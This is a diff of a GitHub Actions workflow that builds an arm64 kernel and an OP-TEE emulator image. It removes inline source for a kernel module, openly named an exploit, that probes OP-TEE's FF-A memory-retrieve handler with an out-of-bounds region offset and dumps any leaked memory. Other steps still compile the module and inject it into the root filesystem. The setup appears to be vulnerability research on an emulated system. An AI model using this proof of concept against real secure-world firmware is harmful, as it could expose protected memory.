@@ -10,6 +10,9 @@ jobs:
     runs-on: ubuntu-22.04
 
     steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
       - name: Free up disk space
         run: |
           sudo rm -rf /usr/share/dotnet /opt/ghc "/usr/local/share/boost" "$AGENT_TOOLSDIRECTORY" /usr/local/lib/android
@@ -59,128 +62,10 @@ jobs:
           make ARCH=arm64 CROSS_COMPILE=../toolchains/aarch64/bin/aarch64-linux-gnu- defconfig
           make ARCH=arm64 CROSS_COMPILE=../toolchains/aarch64/bin/aarch64-linux-gnu- modules_prepare -j$(nproc)
 
-      - name: Create Exploit LKM Source
-        run: |
-          mkdir -p optee-lkm
-          cat > optee-lkm/exploit.c << 'EOF'
-#include <linux/module.h>
-#include <linux/arm-smccc.h>
-#include <linux/io.h>
-#include <linux/slab.h>
-#include <linux/printk.h>
-
-struct __packed ffa_mem_transaction {
-    uint16_t sender_id;
-    uint8_t mem_reg_attr;
-    uint8_t flags;
-    uint32_t global_handle;
-    uint64_t tag;
-    uint32_t mem_access_count;
-    uint32_t mem_access_offs;
-};
-
-struct __packed ffa_mem_access {
-    uint16_t endpoint_id;
-    uint8_t perm;
-    uint8_t flags;
-    uint32_t region_offs;
-};
-
-#define FFA_MEM_RETRIEVE_REQ_SMC64 0xC4000066
-#define FFA_MEM_SHARE_SMC64 0xC4000065
-#define FFA_RXTX_MAP_SMC64 0xC4000006
-
-static int __init exploit_init(void) {
-    struct arm_smccc_res res;
-    void *tx_buf, *rx_buf;
-    struct ffa_mem_transaction *trans;
-    struct ffa_mem_access *mem_acc;
-
-    tx_buf = kmalloc(4096, GFP_KERNEL);
-    rx_buf = kmalloc(4096, GFP_KERNEL);
-    if (!tx_buf || !rx_buf) return -ENOMEM;
-
-    arm_smccc_smc(FFA_RXTX_MAP_SMC64, virt_to_phys(tx_buf), virt_to_phys(rx_buf), 1, 0, 0, 0, 0, &res);
-    pr_info("[oob_read] RXTX_MAP: res.a0=0x%lx\n", res.a0);
-
-    memset(tx_buf, 0, 4096);
-    trans = (struct ffa_mem_transaction *)tx_buf;
-    trans->sender_id = 0x1;
-    trans->mem_reg_attr = 0x2;
-    trans->mem_access_count = 1;
-    trans->mem_access_offs = sizeof(*trans);
-
-    mem_acc = (struct ffa_mem_access *)(tx_buf + trans->mem_access_offs);
-    mem_acc->endpoint_id = 0x8001;
-    mem_acc->perm = 0x2;
-    mem_acc->region_offs = sizeof(*trans) + sizeof(*mem_acc);
-
-    uint32_t *comp_total = (uint32_t *)(tx_buf + mem_acc->region_offs);
-    uint32_t *comp_count = (uint32_t *)(tx_buf + mem_acc->region_offs + 4);
-    *comp_total = 1;
-    *comp_count = 1;
-
-    uint64_t *cons_addr = (uint64_t *)(tx_buf + mem_acc->region_offs + 8);
-    uint32_t *cons_pages = (uint32_t *)(tx_buf + mem_acc->region_offs + 16);
-    *cons_addr = virt_to_phys(tx_buf);
-    *cons_pages = 1;
-
-    uint32_t frag_len = 56;
-    arm_smccc_smc(FFA_MEM_SHARE_SMC64, frag_len, frag_len, 0, 0, 0, 0, 0, &res);
-    pr_info("[oob_read] MEM_SHARE: res.a0=0x%lx handle=0x%lx\n", res.a0, res.a1);
-
-    if (res.a0 == 0x84000060) {
-        pr_err("[oob_read] MEM_SHARE falhou\n");
-        kfree(tx_buf); kfree(rx_buf); return -1;
-    }
-
-    uint64_t handle = ((uint64_t)res.a2 << 32) | res.a1;
-
-    memset(tx_buf, 0, 4096);
-    trans = (struct ffa_mem_transaction *)tx_buf;
-    trans->sender_id = 0x1;
-    trans->mem_reg_attr = 0x2;
-    trans->global_handle = handle;
-    trans->mem_access_count = 1;
-    trans->mem_access_offs = sizeof(*trans);
-
-    mem_acc = (struct ffa_mem_access *)(tx_buf + trans->mem_access_offs);
-    mem_acc->endpoint_id = 0x8001;
-    mem_acc->perm = 0x2;
-    mem_acc->region_offs = 0x1000;
-
-    pr_info("[oob_read] Enviando SMC com region_offs=0x1000 (OOB)...\n");
-    arm_smccc_smc(FFA_MEM_RETRIEVE_REQ_SMC64, 128, 128, 0, 0, 0, 0, 0, &res);
-    pr_info("[oob_read] RETRIEVE_REQ: res.a0=0x%lx\n", res.a0);
-
-    if (res.a0 != 0x84000060) {
-        pr_info("[!!!] CRITICAL: OP-TEE aceitou o offset OOB!\n");
-        uint32_t *leak = (uint32_t *)rx_buf;
-        for (int i = 0; i < 16; i++)
-            pr_info("[oob_read] +%03d: 0x%08x\n", i * 4, leak[i]);
-    } else {
-        pr_info("[oob_read] OP-TEE rejeitou o offset (Safe).\n");
-    }
-
-    kfree(tx_buf);
-    kfree(rx_buf);
-    return 0;
-}
-
-static void __exit exploit_exit(void) { }
-module_init(exploit_init);
-module_exit(exploit_exit);
-MODULE_LICENSE("GPL");
-EOF
-          printf 'obj-m += exploit.o\n' > optee-lkm/Makefile
-          printf 'KDIR ?= $(CURDIR)/../optee-fvp/linux\n' >> optee-lkm/Makefile
-          printf 'all:\n' >> optee-lkm/Makefile
-          printf '\t$(MAKE) -C $(KDIR) M=$(CURDIR) modules ARCH=arm64 CROSS_COMPILE=$(CURDIR)/../optee-fvp/toolchains/aarch64/bin/aarch64-linux-gnu-\n' >> optee-lkm/Makefile
-
       - name: Compile Exploit LKM
         run: |
           cd optee-lkm
-          make
+          make KDIR=$(pwd)/../optee-fvp/linux ARCH=arm64 CROSS_COMPILE=$(pwd)/../optee-fvp/toolchains/aarch64/bin/aarch64-linux-gnu-
 
       - name: Inject Exploit into Rootfs Image
         run: |
@@ -189,12 +74,9 @@ EOF
       - name: List generated artifacts
         if: always()
         run: |
-          echo "=== BINs gerados ==="
-          find . -name "*.bin" | sort
-          echo "=== IMGs gerados ==="
-          find . -name "*.img" | sort
-          echo "=== KOs gerados ==="
-          find . -name "*.ko" | sort
+          echo "=== BINs ===" && find . -name "*.bin" | sort
+          echo "=== IMGs ===" && find . -name "*.img" | sort
+          echo "=== KOs ===" && find . -name "*.ko" | sort
 
       - name: Upload build artifacts
         if: always()
